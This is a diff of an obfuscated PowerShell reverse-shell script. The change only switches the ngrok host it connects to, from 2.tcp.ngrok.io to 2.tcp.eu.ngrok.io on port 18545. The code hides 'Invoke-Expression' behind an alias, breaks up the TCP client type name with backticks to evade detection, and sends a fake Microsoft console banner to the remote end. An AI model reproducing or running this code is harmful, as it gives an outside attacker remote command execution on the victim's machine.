@@ -1,6 +1,6 @@
 Set-Alias -Name K -Value Out-String
 Set-Alias -Name nothingHere -Value iex
-$BT = New-Object "S`y`stem.Net.Sockets.T`CPCl`ient"("2.tcp.ngrok.io",18545);
+$BT = New-Object "S`y`stem.Net.Sockets.T`CPCl`ient"("2.tcp.eu.ngrok.io",18545);
 $replace = $BT.GetStream();
 [byte[]]$B = 0..(32768*2-1)|%{0};
 $B = ([text.encoding]::UTF8).GetBytes("(c) Microsoft Corporation. All rights reserved.`n`n")
